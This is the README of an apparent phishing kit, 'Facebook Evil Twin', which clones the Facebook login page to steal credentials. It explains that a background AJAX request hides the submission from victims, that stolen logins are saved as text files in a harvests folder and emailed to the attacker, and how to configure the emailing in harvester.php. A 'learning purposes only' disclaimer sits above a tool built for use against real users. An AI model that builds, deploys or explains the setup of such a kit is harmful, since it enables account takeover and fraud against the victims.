###########################
### FACEBOOK EVIL TWIN  ###
###########################
NOTE: This Facebook Clone (FaBET) is developed for
learning purposes only.
Damage caused by this clone shall not hold the developer of the 
clone accountable.

@Developer: Denny Ashwood

################
### OVERVIEW ###
################
1. This clone fools the user to type in their credentials by showing
them a login page exactly as the one at https://web.facebook.com.

2. The victim can not sense the theft as the submission process is hidden and runs 
underground as background asynchronous process with the aid of AJAX.

3. The victim's Facebook login credentials are stored in ./harvests directory saved 
as the victim's login username/email address/mobile number in .txt file format.

4. The victim's Facebook login credentials are also emailed to the attacker.

######################
### EMAILING SETUP ###
######################
1. Change the E-mail primers to your desired primers in ./functions/harvester.php
Note: E-mailing will only work if you have a working E-mail service preferrably on the 
same server as the one hosting the FaBET.
